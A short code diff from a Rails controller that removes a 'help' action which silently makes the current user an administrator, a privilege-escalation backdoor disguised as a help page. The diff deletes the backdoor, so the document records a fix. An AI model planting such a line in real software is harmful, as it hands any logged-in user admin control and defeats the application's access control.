@@ -7,11 +7,6 @@ class StaticPagesController < ApplicationController
     @proveniences = Provenience.all
   end
 
-  def help
-     current_user.update_attribute :admin, true
-
-  end
-
   def about
   end
   
